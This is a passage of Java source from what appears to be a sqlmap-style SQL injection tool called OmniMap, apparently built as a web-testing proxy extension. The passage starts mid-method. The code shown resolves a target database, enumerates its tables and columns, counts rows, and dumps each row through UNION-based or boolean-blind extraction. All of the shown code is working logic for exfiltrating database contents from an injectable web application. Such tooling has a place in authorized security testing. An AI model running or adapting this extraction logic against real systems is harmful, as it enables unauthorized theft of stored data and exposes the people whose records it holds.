        if (targetDb == null || targetDb.isEmpty()) {
            callback.onError("Could not determine target database");
            return;
        }

        // Cascade: if no table specified, enumerate all tables and list columns for each
        List<String> tables = resolveTables(targetDb, config, dialect, callback, result, request);
        if (tables.isEmpty()) {
            callback.onError("No tables found in " + targetDb);
            return;
        }

        for (int t = 0; t < tables.size() && !cancelled; t++) {
            String table = tables.get(t);
            callback.onProgress("Extracting columns from " + targetDb + "." + table +
                    " (" + (t + 1) + "/" + tables.size() + ")...", 30 + (t * 60 / tables.size()));
            List<String> columns = extractValues(dialect.listColumns(targetDb, table),
                    config, dialect, callback, result, request);
            if (columns != null && !columns.isEmpty()) {
                result.setColumns(targetDb + "." + table, columns);
                callback.onColumnsFound(targetDb, table, columns);
            }
        }
        callback.onProgress("Column enumeration complete", 90);
    }

    /**
     * Dump data — cascades like sqlmap's --dump:
     * 1. Resolve database (current DB if not specified)
     * 2. Resolve tables (enumerate all if not specified)
     * 3. For each table: resolve columns, count rows, dump all rows
     */
    private void dumpData(OmniMapConfig config, DbmsDialect dialect,
                           OmniMapCallback callback, OmniMapResult result,
                           HttpRequestResponse request) {
        String targetDb = resolveDatabase(config, dialect, callback, result, request);
        if (targetDb == null || targetDb.isEmpty()) {
            callback.onError("Could not determine target database");
            return;
        }

        List<String> tables = resolveTables(targetDb, config, dialect, callback, result, request);
        if (tables.isEmpty()) {
            callback.onError("No tables found in " + targetDb);
            return;
        }

        // Dump each table
        for (int t = 0; t < tables.size() && !cancelled; t++) {
            String table = tables.get(t);
            callback.onProgress("Dumping table " + (t + 1) + "/" + tables.size() + ": " +
                    targetDb + "." + table + "...", 25 + (t * 65 / tables.size()));

            dumpSingleTable(targetDb, table, config, dialect, callback, result, request);
        }
    }

    /**
     * Dump a single table: resolve columns → count rows → extract all rows.
     */
    private void dumpSingleTable(String targetDb, String table, OmniMapConfig config,
                                  DbmsDialect dialect, OmniMapCallback callback,
                                  OmniMapResult result, HttpRequestResponse request) {
        // Get columns
        List<String> columns = config.getTargetColumns();
        if (columns == null || columns.isEmpty()) {
            columns = extractValues(dialect.listColumns(targetDb, table),
                    config, dialect, callback, result, request);
            if (columns == null || columns.isEmpty()) {
                callback.onProgress("Skipping " + table + " — could not determine columns", 0);
                return;
            }
            result.setColumns(targetDb + "." + table, columns);
            callback.onColumnsFound(targetDb, table, columns);
        }

        // Get row count
        String countStr = extractValue(dialect.countRows(targetDb, table),
                config, dialect, callback, result, request);
        int rowCount = 0;
        try { rowCount = Integer.parseInt(countStr != null ? countStr.trim() : "0"); }
        catch (NumberFormatException ignored) {}

        // If count unknown, dump until empty (cap at 500 for safety)
        int maxRows = rowCount > 0 ? rowCount : 500;
        int limit = config.getDumpLimit() > 0 ? Math.min(config.getDumpLimit(), maxRows) : maxRows;

        if (rowCount > 0) {
            callback.onProgress("Dumping " + limit + " row(s) from " + table + "...", 0);
        } else {
            callback.onProgress("Row count unknown — dumping " + table + "...", 0);
        }

        String dbTable = targetDb + "." + table;

        for (int offset = 0; offset < limit && !cancelled; offset++) {
            String query = dialect.dumpData(targetDb, table, columns, offset, 1);
            String rowData = extractValue(query, config, dialect, callback, result, request);
            if (rowData == null || rowData.isEmpty()) break;

            Map<String, String> row = parseRow(rowData, columns);
            result.addRow(dbTable, row);
            callback.onRowExtracted(targetDb, table, row);

            callback.onProgress("Dumped " + (offset + 1) + "/" +
                    (rowCount > 0 ? String.valueOf(limit) : "?") + " rows from " + table, 0);
        }
    }

    // ==================== Extraction Helpers ====================

    /**
     * Extract a single value using the best available technique.
     * Extraction preference: UNION > Boolean Blind
     */
    private String extractValue(String query, OmniMapConfig config, DbmsDialect dialect,
                                 OmniMapCallback callback, OmniMapResult result,
                                 HttpRequestResponse request) {
        if (cancelled) return null;

        // 1. Try UNION first (fastest — full result in 1 request)
        if (unionExtractor != null) {
            String val = unionExtractor.extractSingle(query);
            if (val != null) return val;
        }
        // 2. Try Boolean Blind (bisection — multiple requests per value)
        if (blindExtractor != null) {
            String predicted = blindExtractor.tryPredictive(query);
            if (predicted != null) return predicted;
            String val = blindExtractor.extractSingle(query);
            if (val != null) return val;
        }

        return null;
    }

    /**
     * Extract a list of values using the best available technique.
     * Extraction preference: UNION > Boolean Blind
     */
    private List<String> extractValues(String query, OmniMapConfig config, DbmsDialect dialect,
                                        OmniMapCallback callback, OmniMapResult result,
                                        HttpRequestResponse request) {
        if (cancelled) return new ArrayList<>();

        // 1. UNION first (fastest — GROUP_CONCAT or row-by-row with full result per request)
        if (unionExtractor != null) {
            List<String> vals = unionExtractor.extractList(query);
            if (!vals.isEmpty()) return vals;
        }
        // 2. Boolean Blind
        if (blindExtractor != null) {
            List<String> vals = blindExtractor.extractList(query);
            if (!vals.isEmpty()) return vals;
        }

        return new ArrayList<>();
    }

    /**
     * Parse a pipe-delimited row string into a column→value map.
     */
    private Map<String, String> parseRow(String rowData, List<String> columns) {
        Map<String, String> row = new LinkedHashMap<>();
        String[] values = rowData.split("\\|", -1);
        for (int i = 0; i < columns.size(); i++) {
            String value = i < values.length ? values[i].trim() : "";
            row.put(columns.get(i), value);
        }
        return row;
    }
}
